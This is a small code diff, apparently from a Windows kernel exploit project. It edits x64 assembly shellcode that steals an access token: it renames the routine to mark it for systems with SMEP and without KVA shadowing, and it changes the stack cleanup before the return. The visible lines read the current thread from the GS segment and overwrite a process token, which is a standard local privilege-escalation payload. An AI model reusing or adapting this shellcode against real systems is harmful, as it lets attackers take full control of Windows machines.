@@ -19,7 +19,7 @@ RESTORE_REGS MACRO
     pop rax
 ENDM
 
-token_stealing PROC
+token_stealing_shellcode_smep_no_kvashadow PROC
     SAVE_REGS
     xor rax,rax
     mov rax,gs:[rax+KTHREAD_OFFSET]    ; Get current KTHREAD
@@ -35,9 +35,9 @@ __loop:
     mov [rcx+TOKEN_OFFSET],rdx         ; Set token
     RESTORE_REGS
     xor r12,r12
-    add rsp,28h
+    add rsp,10h
     mov r15,[rsp+88h]
     ret
-token_stealing ENDP
+token_stealing_shellcode_smep_no_kvashadow ENDP
 
 END
